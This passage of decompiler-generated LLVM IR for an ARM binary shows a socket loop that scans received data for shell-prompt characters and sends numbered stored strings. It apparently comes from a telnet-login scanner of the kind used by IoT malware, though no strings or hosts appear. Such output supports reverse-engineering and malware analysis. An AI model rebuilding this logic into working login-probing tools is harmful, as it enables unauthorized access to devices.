  %v2_10ab8 = inttoptr i32 %v1_10ab8 to i32*
  %v3_10ab8 = load i32, i32* %v2_10ab8, align 4
  store i32 %v3_10ab8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10ac0 = inttoptr i32 %v3_10ab8 to i32*
  %v5_10ac0 = call i32 @send(i32 %v3_10ab0, i32* %v4_10ac0, i32 %v4_10ab4, i32 16384)
  store i32 %v5_10ac0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10ac8 = load i32, i32* @r6, align 4
  %v1_10ac8 = add i32 %v0_10ac8, 4
  %v2_10ac8 = inttoptr i32 %v1_10ac8 to i32*
  %v3_10ac8 = load i32, i32* %v2_10ac8, align 4
  store i32 %v3_10ac8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10ad4 = call i32 @send(i32 %v3_10ac8, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 %v5_10ad4, i32* %r0.global-to-local, align 4
  %v0_10ad8 = load i32, i32* @r6, align 4
  %v1_10ad8 = add i32 %v0_10ad8, 24
  %v2_10ad8 = inttoptr i32 %v1_10ad8 to i32*
  %v3_10ad8 = load i32, i32* %v2_10ad8, align 4
  store i32 %v3_10ad8, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_10ae0 = add i32 %v0_10ad8, 12
  %v3_10ae0 = inttoptr i32 %v2_10ae0 to i32*
  store i32 5, i32* %v3_10ae0, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10ae8:                               ; preds = %dec_label_pc_1088c
  %v1_10ae8 = add i32 %v0_1088c, 24
  %v2_10ae8 = inttoptr i32 %v1_10ae8 to i32*
  %v3_10ae8 = load i32, i32* %v2_10ae8, align 4
  store i32 %v3_10ae8, i32* %ip.global-to-local, align 4
  %v1_10aec = add i32 %v3_10ae8, -1
  store i32 %v1_10aec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10af0 = icmp eq i32 %v1_10aec, 0
  store i1 %v2_10af0, i1* %cpsr_z.global-to-local, align 1
  %v5_10af4 = icmp sgt i32 %v1_10aec, 0
  br i1 %v5_10af4, label %dec_label_pc_10b1c, label %dec_label_pc_10810.backedge.thread

dec_label_pc_10afc:                               ; preds = %bb357
  %v2_10afc = icmp ugt i8 %v3_10b20, 35
  store i1 %v2_10afc, i1* %cpsr_c.global-to-local, align 1
  %v7_10afc = icmp eq i8 %v3_10b20, 36
  store i1 %v7_10afc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10afc, label %dec_label_pc_10b30, label %dec_label_pc_10b04

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10afc
  %v2_10b04 = icmp ugt i8 %v3_10b20, 34
  store i1 %v2_10b04, i1* %cpsr_c.global-to-local, align 1
  %v7_10b04 = icmp eq i8 %v3_10b20, 35
  store i1 %v7_10b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b04, label %dec_label_pc_10b30, label %dec_label_pc_10b0c

dec_label_pc_10b0c:                               ; preds = %dec_label_pc_10b04
  %v2_10b0c = icmp ugt i8 %v3_10b20, 36
  store i1 %v2_10b0c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b0c = icmp eq i8 %v3_10b20, 37
  store i1 %v7_10b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b0c, label %dec_label_pc_10b30, label %dec_label_pc_10b14

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10b0c
  %v1_10b14 = add i32 %v0_10b30, -1
  store i32 %v1_10b14, i32* %r0.global-to-local, align 4
  %v2_10b14 = icmp ne i32 %v0_10b30, 0
  store i1 %v2_10b14, i1* %cpsr_c.global-to-local, align 1
  %v7_10b14 = icmp eq i32 %v0_10b30, 1
  store i1 %v7_10b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b14, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10b1c

dec_label_pc_10b1c:                               ; preds = %dec_label_pc_10ae8, %dec_label_pc_10b14
  %v0_10b30 = phi i32 [ %v1_10b14, %dec_label_pc_10b14 ], [ %v1_10aec, %dec_label_pc_10ae8 ]
  %v2_10b1c = add i32 %v0_10b30, %v0_1088c
  store i32 %v2_10b1c, i32* %r3.global-to-local, align 4
  %v1_10b20 = add i32 %v2_10b1c, 28
  %v2_10b20 = inttoptr i32 %v1_10b20 to i8*
  %v3_10b20 = load i8, i8* %v2_10b20, align 1
  %v4_10b20 = zext i8 %v3_10b20 to i32
  store i32 %v4_10b20, i32* %r3.global-to-local, align 4
  %v2_10b24 = icmp ugt i8 %v3_10b20, 61
  store i1 %v2_10b24, i1* %cpsr_c.global-to-local, align 1
  %v7_10b24 = icmp eq i8 %v3_10b20, 62
  store i1 %v7_10b24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b24, label %dec_label_pc_10b30, label %bb357

bb357:                                            ; preds = %dec_label_pc_10b1c
  %v3_10b28 = icmp ugt i8 %v3_10b20, 57
  store i1 %v3_10b28, i1* %cpsr_c.global-to-local, align 1
  %v8_10b28 = icmp eq i8 %v3_10b20, 58
  store i1 %v8_10b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10b28, label %dec_label_pc_10b30, label %dec_label_pc_10afc

dec_label_pc_10b30:                               ; preds = %dec_label_pc_10b1c, %bb357, %dec_label_pc_10b0c, %dec_label_pc_10b04, %dec_label_pc_10afc
  %v1_10b30 = add i32 %v0_10b30, 1
  store i32 %v1_10b30, i32* @r7, align 4
  %v2_10b34 = icmp eq i32 %v1_10b30, -1
  store i1 %v2_10b34, i1* %cpsr_c.global-to-local, align 1
  %v7_10b34 = icmp eq i32 %v0_10b30, -2
  store i1 %v7_10b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10b34, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10b3c

dec_label_pc_10b3c:                               ; preds = %dec_label_pc_10b30
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b3c = icmp eq i32 %v1_10b30, 0
  store i1 %v2_10b3c, i1* %cpsr_z.global-to-local, align 1
  %tmp358 = icmp slt i32 %v1_10b30, 1
  br i1 %tmp358, label %dec_label_pc_10998, label %dec_label_pc_10b44

dec_label_pc_10b44:                               ; preds = %dec_label_pc_10b3c
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10b48 = call i32 @function_11394(i32 7)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_10b58 = call i32 @function_112b0(i32 7, i32* nonnull %stack_var_-56)
  store i32 %v3_10b58, i32* %r0.global-to-local, align 4
  %v3_10b5c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10b5c, i32* %r2.global-to-local, align 4
  store i32 %v3_10b58, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b68 = load i32, i32* @r6, align 4
  %v1_10b68 = add i32 %v0_10b68, 4
  %v2_10b68 = inttoptr i32 %v1_10b68 to i32*
  %v3_10b68 = load i32, i32* %v2_10b68, align 4
  store i32 %v3_10b68, i32* %r0.global-to-local, align 4
  %v4_10b6c = inttoptr i32 %v3_10b58 to i32*
  %v5_10b6c = call i32 @send(i32 %v3_10b68, i32* %v4_10b6c, i32 %v3_10b5c, i32 16384)
  store i32 %v5_10b6c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10b7c = load i32, i32* @r6, align 4
  %v1_10b7c = add i32 %v0_10b7c, 4
  %v2_10b7c = inttoptr i32 %v1_10b7c to i32*
  %v3_10b7c = load i32, i32* %v2_10b7c, align 4
  store i32 %v3_10b7c, i32* %r0.global-to-local, align 4
  %v5_10b80 = call i32 @send(i32 %v3_10b7c, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_10b88 = call i32 @function_112dc(i32 7)
  store i32 %v1_10b88, i32* %r0.global-to-local, align 4
  %v0_10b8c = load i32, i32* @r6, align 4
  %v1_10b8c = add i32 %v0_10b8c, 24
  %v2_10b8c = inttoptr i32 %v1_10b8c to i32*
  %v3_10b8c = load i32, i32* %v2_10b8c, align 4
  store i32 %v3_10b8c, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_10b94 = add i32 %v0_10b8c, 12
  %v3_10b94 = inttoptr i32 %v2_10b94 to i32*
  store i32 6, i32* %v3_10b94, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10c10:                               ; preds = %dec_label_pc_1088c
  %v1_10c10 = add i32 %v0_1088c, 24
  %v2_10c10 = inttoptr i32 %v1_10c10 to i32*
  %v3_10c10 = load i32, i32* %v2_10c10, align 4
  store i32 %v3_10c10, i32* %ip.global-to-local, align 4
  %v1_10c14 = add i32 %v3_10c10, -1
  store i32 %v1_10c14, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c18 = icmp eq i32 %v1_10c14, 0
  store i1 %v2_10c18, i1* %cpsr_z.global-to-local, align 1
  %v5_10c1c = icmp sgt i32 %v1_10c14, 0
  br i1 %v5_10c1c, label %dec_label_pc_10c44, label %dec_label_pc_10810.backedge.thread

dec_label_pc_10c24:                               ; preds = %bb359
  %v2_10c24 = icmp ugt i8 %v3_10c48, 35
  store i1 %v2_10c24, i1* %cpsr_c.global-to-local, align 1
  %v7_10c24 = icmp eq i8 %v3_10c48, 36
  store i1 %v7_10c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c24, label %dec_label_pc_10c58, label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10c24
  %v2_10c2c = icmp ugt i8 %v3_10c48, 34
  store i1 %v2_10c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c2c = icmp eq i8 %v3_10c48, 35
  store i1 %v7_10c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c2c, label %dec_label_pc_10c58, label %dec_label_pc_10c34

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10c2c
  %v2_10c34 = icmp ugt i8 %v3_10c48, 36
  store i1 %v2_10c34, i1* %cpsr_c.global-to-local, align 1
  %v7_10c34 = icmp eq i8 %v3_10c48, 37
  store i1 %v7_10c34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c34, label %dec_label_pc_10c58, label %dec_label_pc_10c3c

dec_label_pc_10c3c:                               ; preds = %dec_label_pc_10c34
  %v1_10c3c = add i32 %v0_10c58, -1
  store i32 %v1_10c3c, i32* %r0.global-to-local, align 4
  %v2_10c3c = icmp ne i32 %v0_10c58, 0
  store i1 %v2_10c3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c3c = icmp eq i32 %v0_10c58, 1
  store i1 %v7_10c3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c3c, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c10, %dec_label_pc_10c3c
  %v0_10c58 = phi i32 [ %v1_10c3c, %dec_label_pc_10c3c ], [ %v1_10c14, %dec_label_pc_10c10 ]
  %v2_10c44 = add i32 %v0_10c58, %v0_1088c
  store i32 %v2_10c44, i32* %r3.global-to-local, align 4
  %v1_10c48 = add i32 %v2_10c44, 28
  %v2_10c48 = inttoptr i32 %v1_10c48 to i8*
  %v3_10c48 = load i8, i8* %v2_10c48, align 1
  %v4_10c48 = zext i8 %v3_10c48 to i32
  store i32 %v4_10c48, i32* %r3.global-to-local, align 4
  %v2_10c4c = icmp ugt i8 %v3_10c48, 61
  store i1 %v2_10c4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c4c = icmp eq i8 %v3_10c48, 62
  store i1 %v7_10c4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c4c, label %dec_label_pc_10c58, label %bb359

bb359:                                            ; preds = %dec_label_pc_10c44
  %v3_10c50 = icmp ugt i8 %v3_10c48, 57
  store i1 %v3_10c50, i1* %cpsr_c.global-to-local, align 1
  %v8_10c50 = icmp eq i8 %v3_10c48, 58
  store i1 %v8_10c50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10c50, label %dec_label_pc_10c58, label %dec_label_pc_10c24

dec_label_pc_10c58:                               ; preds = %dec_label_pc_10c44, %bb359, %dec_label_pc_10c34, %dec_label_pc_10c2c, %dec_label_pc_10c24
  %v1_10c58 = add i32 %v0_10c58, 1
  store i32 %v1_10c58, i32* @r7, align 4
  %v2_10c5c = icmp eq i32 %v1_10c58, -1
  store i1 %v2_10c5c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c5c = icmp eq i32 %v0_10c58, -2
  store i1 %v7_10c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c5c, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c58
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c64 = icmp eq i32 %v1_10c58, 0
  store i1 %v2_10c64, i1* %cpsr_z.global-to-local, align 1
  %tmp360 = icmp slt i32 %v1_10c58, 1
  br i1 %tmp360, label %dec_label_pc_10998, label %dec_label_pc_10c6c

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c64
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10c70 = call i32 @function_11394(i32 8)
  store i32 %v2_10c78, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v3_10c80 = call i32 @function_112b0(i32 8, i32* nonnull %stack_var_-48)
  store i32 %v3_10c80, i32* %r0.global-to-local, align 4
  %v3_10c84 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10c84, i32* %r2.global-to-local, align 4
  store i32 %v3_10c80, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10c90 = load i32, i32* @r6, align 4
  %v1_10c90 = add i32 %v0_10c90, 4
  %v2_10c90 = inttoptr i32 %v1_10c90 to i32*
  %v3_10c90 = load i32, i32* %v2_10c90, align 4
  store i32 %v3_10c90, i32* %r0.global-to-local, align 4
  %v4_10c94 = inttoptr i32 %v3_10c80 to i32*
  %v5_10c94 = call i32 @send(i32 %v3_10c90, i32* %v4_10c94, i32 %v3_10c84, i32 16384)
  store i32 %v5_10c94, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ca4 = load i32, i32* @r6, align 4
  %v1_10ca4 = add i32 %v0_10ca4, 4
  %v2_10ca4 = inttoptr i32 %v1_10ca4 to i32*
  %v3_10ca4 = load i32, i32* %v2_10ca4, align 4
  store i32 %v3_10ca4, i32* %r0.global-to-local, align 4
  %v5_10ca8 = call i32 @send(i32 %v3_10ca4, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10cb0 = call i32 @function_112dc(i32 8)
  store i32 %v1_10cb0, i32* %r0.global-to-local, align 4
  %v0_10cb4 = load i32, i32* @r6, align 4
  %v1_10cb4 = add i32 %v0_10cb4, 24
  %v2_10cb4 = inttoptr i32 %v1_10cb4 to i32*
  %v3_10cb4 = load i32, i32* %v2_10cb4, align 4
  store i32 %v3_10cb4, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_10cbc = add i32 %v0_10cb4, 12
  %v3_10cbc = inttoptr i32 %v2_10cbc to i32*
  store i32 7, i32* %v3_10cbc, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10cc4:                               ; preds = %dec_label_pc_1088c
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_10cc8 = call i32 @function_11394(i32 12)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v3_10cd8 = call i32 @function_112b0(i32 12, i32* nonnull %stack_var_-56)
  %v3_10cdc = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10cd8, i32* %r2.global-to-local, align 4
  %v1_10ce4 = add i32 %v3_10cdc, -1
  store i32 %v1_10ce4, i32* %r3.global-to-local, align 4
  %v0_10ce8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10ce8, i32* %r0.global-to-local, align 4
  %v0_10cec = load i32, i32* @r6, align 4
  %v1_10cec = add i32 %v0_10cec, 24
  %v2_10cec = inttoptr i32 %v1_10cec to i32*
  %v3_10cec = load i32, i32* %v2_10cec, align 4
  store i32 %v3_10cec, i32* %r1.global-to-local, align 4
  %v4_10cf0 = call i32 @function_11aa0(i32 %v0_10ce8, i32 %v3_10cec, i32 %v3_10cd8, i32 %v1_10ce4)
  %v2_10cf4 = icmp eq i32 %v4_10cf0, -1
  store i1 %v2_10cf4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_10cf4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_10cf0, i32* @r4, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  %v1_11048 = call i32 @function_112dc(i32 12)
  br i1 %v2_10cf4, label %dec_label_pc_11044, label %dec_label_pc_10d00

dec_label_pc_10d00:                               ; preds = %dec_label_pc_10cc4
  store i32 %v1_11048, i32* %r0.global-to-local, align 4
  %v0_10d08 = load i32, i32* @r6, align 4
  %v1_10d08 = add i32 %v0_10d08, 4
  %v2_10d08 = inttoptr i32 %v1_10d08 to i32*
  %v3_10d08 = load i32, i32* %v2_10d08, align 4
  store i32 %v3_10d08, i32* %r0.global-to-local, align 4
  %v1_10d0c = call i32 @close(i32 %v3_10d08)
  store i32 %v1_10d0c, i32* %r0.global-to-local, align 4
  %v0_10d10 = load i32, i32* @r6, align 4
  %v1_10d10 = add i32 %v0_10d10, 284
  %v2_10d10 = inttoptr i32 %v1_10d10 to i8*
  %v3_10d10 = load i8, i8* %v2_10d10, align 1
  %v4_10d10 = zext i8 %v3_10d10 to i32
  %v1_10d14 = add nuw nsw i32 %v4_10d10, 1
  %v1_10d18 = urem i32 %v1_10d14, 256
  store i32 %v1_10d18, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r4, align 4
  %v2_10d20 = icmp ugt i32 %v1_10d18, 9
  store i1 %v2_10d20, i1* %cpsr_c.global-to-local, align 1
  %v7_10d20 = icmp eq i32 %v1_10d18, 10
  store i1 %v7_10d20, i1* %cpsr_z.global-to-local, align 1
  %v2_10d24 = add i32 %v0_10d10, 4
  %v3_10d24 = inttoptr i32 %v2_10d24 to i32*
  store i32 -1, i32* %v3_10d24, align 4
  %v0_10d28 = load i32, i32* %r3.global-to-local, align 4
  %v1_10d28 = trunc i32 %v0_10d28 to i8
  %v2_10d28 = load i32, i32* @r6, align 4
  %v3_10d28 = add i32 %v2_10d28, 284
  %v4_10d28 = inttoptr i32 %v3_10d28 to i8*
  store i8 %v1_10d28, i8* %v4_10d28, align 1
  %v0_10d2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10d2c, label %dec_label_pc_10d30, label %dec_label_pc_111a4

dec_label_pc_10d30:                               ; preds = %dec_label_pc_10d00
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10d38 = load i32, i32* @r6, align 4
  %v1_10d38 = add i32 %v0_10d38, 24
  %v2_10d38 = inttoptr i32 %v1_10d38 to i32*
  %v3_10d38 = load i32, i32* %v2_10d38, align 4
  store i32 %v3_10d38, i32* %ip.global-to-local, align 4
  %v3_10d3c = add i32 %v0_10d38, 284
  %v4_10d3c = inttoptr i32 %v3_10d3c to i8*
  store i8 0, i8* %v4_10d3c, align 1
  %v0_10d40 = load i32, i32* %r0.global-to-local, align 4
  %v1_10d40 = load i32, i32* @r6, align 4
  %v2_10d40 = add i32 %v1_10d40, 12
  %v3_10d40 = inttoptr i32 %v2_10d40 to i32*
  store i32 %v0_10d40, i32* %v3_10d40, align 4
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %.thread236, %dec_label_pc_10f30, %dec_label_pc_10e7c, %dec_label_pc_10dc8, %dec_label_pc_111a4, %dec_label_pc_110e0, %dec_label_pc_10c6c, %dec_label_pc_10b44, %dec_label_pc_10aac, %dec_label_pc_10a14, %dec_label_pc_109a0, %dec_label_pc_10d30
  %v0_10d48 = load i32, i32* %ip.global-to-local, align 4
  %v1_10d48 = load i32, i32* @r7, align 4
  %v2_10d48 = sub i32 %v0_10d48, %v1_10d48
  %v3_10d48 = icmp uge i32 %v0_10d48, %v1_10d48
  store i1 %v3_10d48, i1* %cpsr_c.global-to-local, align 1
  %v4_10d48 = xor i32 %v1_10d48, %v0_10d48
  %v5_10d48 = xor i32 %v2_10d48, %v0_10d48
  %v6_10d48 = and i32 %v5_10d48, %v4_10d48
  %v7_10d48 = icmp slt i32 %v6_10d48, 0
  %v8_10d48 = icmp slt i32 %v2_10d48, 0
  %v9_10d48 = icmp eq i32 %v0_10d48, %v1_10d48
  store i1 %v9_10d48, i1* %cpsr_z.global-to-local, align 1
  %v2_10d4c = xor i1 %v8_10d48, %v7_10d48
  %v0_10d48.v1_10d48 = select i1 %v2_10d4c, i32 %v0_10d48, i32 %v1_10d48
  store i32 %v0_10d48.v1_10d48, i32* %r1.global-to-local, align 4
  %v2_10d54 = sub i32 %v0_10d48, %v0_10d48.v1_10d48
  store i32 %v2_10d54, i32* %r2.global-to-local, align 4
  %v1_10d58 = load i32, i32* @r6, align 4
  %v2_10d58 = add i32 %v1_10d58, 24
  %v3_10d58 = inttoptr i32 %v2_10d58 to i32*
  store i32 %v2_10d54, i32* %v3_10d58, align 4
  %v0_10d5c = load i32, i32* %r8.global-to-local, align 4
  %v1_10d5c = load i32, i32* %r1.global-to-local, align 4
  %v2_10d5c = add i32 %v1_10d5c, %v0_10d5c
  store i32 %v2_10d5c, i32* %r1.global-to-local, align 4
  store i32 %v0_10d5c, i32* %r0.global-to-local, align 4
  %v3_10d64 = inttoptr i32 %v0_10d5c to i32*
  %v4_10d64 = inttoptr i32 %v2_10d5c to i32*
  %v5_10d64 = call i32* @memmove(i32* %v3_10d64, i32* %v4_10d64, i32 %v2_10d54)
  %v7_10d64 = ptrtoint i32* %v5_10d64 to i32
  store i32 %v7_10d64, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1088c

dec_label_pc_10d6c:                               ; preds = %dec_label_pc_1088c
  %v1_10d6c = add i32 %v0_1088c, 24
  %v2_10d6c = inttoptr i32 %v1_10d6c to i32*
  %v3_10d6c = load i32, i32* %v2_10d6c, align 4
  store i32 %v3_10d6c, i32* %ip.global-to-local, align 4
  %v1_10d70 = add i32 %v3_10d6c, -1
  store i32 %v1_10d70, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10d74 = icmp eq i32 %v1_10d70, 0
  store i1 %v2_10d74, i1* %cpsr_z.global-to-local, align 1
  %v5_10d78 = icmp sgt i32 %v1_10d70, 0
  br i1 %v5_10d78, label %dec_label_pc_10da0, label %dec_label_pc_10810.backedge.thread

dec_label_pc_10d80:                               ; preds = %bb363
  %v2_10d80 = icmp ugt i8 %v3_10da4, 35
  store i1 %v2_10d80, i1* %cpsr_c.global-to-local, align 1
  %v7_10d80 = icmp eq i8 %v3_10da4, 36
  store i1 %v7_10d80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d80, label %dec_label_pc_10db4, label %dec_label_pc_10d88

dec_label_pc_10d88:                               ; preds = %dec_label_pc_10d80
  %v2_10d88 = icmp ugt i8 %v3_10da4, 34
  store i1 %v2_10d88, i1* %cpsr_c.global-to-local, align 1
  %v7_10d88 = icmp eq i8 %v3_10da4, 35
  store i1 %v7_10d88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d88, label %dec_label_pc_10db4, label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d88
  %v2_10d90 = icmp ugt i8 %v3_10da4, 36
  store i1 %v2_10d90, i1* %cpsr_c.global-to-local, align 1
  %v7_10d90 = icmp eq i8 %v3_10da4, 37
  store i1 %v7_10d90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d90, label %dec_label_pc_10db4, label %dec_label_pc_10d98

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d90
  %v1_10d98 = add i32 %v0_10db4, -1
  store i32 %v1_10d98, i32* %r0.global-to-local, align 4
  %v2_10d98 = icmp ne i32 %v0_10db4, 0
  store i1 %v2_10d98, i1* %cpsr_c.global-to-local, align 1
  %v7_10d98 = icmp eq i32 %v0_10db4, 1
  store i1 %v7_10d98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d98, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d6c, %dec_label_pc_10d98
  %v0_10db4 = phi i32 [ %v1_10d98, %dec_label_pc_10d98 ], [ %v1_10d70, %dec_label_pc_10d6c ]
  %v2_10da0 = add i32 %v0_10db4, %v0_1088c
  store i32 %v2_10da0, i32* %r3.global-to-local, align 4
  %v1_10da4 = add i32 %v2_10da0, 28
  %v2_10da4 = inttoptr i32 %v1_10da4 to i8*
  %v3_10da4 = load i8, i8* %v2_10da4, align 1
  %v4_10da4 = zext i8 %v3_10da4 to i32
  store i32 %v4_10da4, i32* %r3.global-to-local, align 4
  %v2_10da8 = icmp ugt i8 %v3_10da4, 61
  store i1 %v2_10da8, i1* %cpsr_c.global-to-local, align 1
  %v7_10da8 = icmp eq i8 %v3_10da4, 62
  store i1 %v7_10da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10da8, label %dec_label_pc_10db4, label %bb363

bb363:                                            ; preds = %dec_label_pc_10da0
  %v3_10dac = icmp ugt i8 %v3_10da4, 57
  store i1 %v3_10dac, i1* %cpsr_c.global-to-local, align 1
  %v8_10dac = icmp eq i8 %v3_10da4, 58
  store i1 %v8_10dac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10dac, label %dec_label_pc_10db4, label %dec_label_pc_10d80

dec_label_pc_10db4:                               ; preds = %dec_label_pc_10da0, %bb363, %dec_label_pc_10d90, %dec_label_pc_10d88, %dec_label_pc_10d80
  %v1_10db4 = add i32 %v0_10db4, 1
  store i32 %v1_10db4, i32* @r7, align 4
  %v2_10db8 = icmp eq i32 %v1_10db4, -1
  store i1 %v2_10db8, i1* %cpsr_c.global-to-local, align 1
  %v7_10db8 = icmp eq i32 %v0_10db4, -2
  store i1 %v7_10db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10db8, label %dec_label_pc_10810.backedge.thread501, label %dec_label_pc_10dc0

dec_label_pc_10dc0:                               ; preds = %dec_label_pc_10db4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10dc0 = icmp eq i32 %v1_10db4, 0
  store i1 %v2_10dc0, i1* %cpsr_z.global-to-local, align 1
  %tmp364 = icmp slt i32 %v1_10db4, 1
  br i1 %tmp364, label %dec_label_pc_10998, label %dec_label_pc_10dc8

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10dc0
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_10dcc = call i32 @function_11394(i32 9)
  store i32 %v2_10780, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_10ddc = call i32 @function_112b0(i32 9, i32* nonnull %stack_var_-56)
  store i32 %v3_10ddc, i32* %r0.global-to-local, align 4
  %v3_10de0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10de0, i32* %r2.global-to-local, align 4
  store i32 %v3_10ddc, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10dec = load i32, i32* @r6, align 4
  %v1_10dec = add i32 %v0_10dec, 4
  %v2_10dec = inttoptr i32 %v1_10dec to i32*
  %v3_10dec = load i32, i32* %v2_10dec, align 4
  store i32 %v3_10dec, i32* %r0.global-to-local, align 4
  %v4_10df0 = inttoptr i32 %v3_10ddc to i32*
  %v5_10df0 = call i32 @send(i32 %v3_10dec, i32* %v4_10df0, i32 %v3_10de0, i32 16384)
  store i32 %v5_10df0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1230c.259 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10e00 = load i32, i32* @r6, align 4
  %v1_10e00 = add i32 %v0_10e00, 4
  %v2_10e00 = inttoptr i32 %v1_10e00 to i32*
  %v3_10e00 = load i32, i32* %v2_10e00, align 4
  store i32 %v3_10e00, i32* %r0.global-to-local, align 4
  %v5_10e04 = call i32 @send(i32 %v3_10e00, i32* bitcast ([3 x i8]* @global_var_1230c.259 to i32*), i32 2, i32 16384)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_10e0c = call i32 @function_112dc(i32 9)
  store i32 %v1_10e0c, i32* %r0.global-to-local, align 4
  %v0_10e10 = load i32, i32* @r6, align 4
  %v1_10e10 = add i32 %v0_10e10, 24
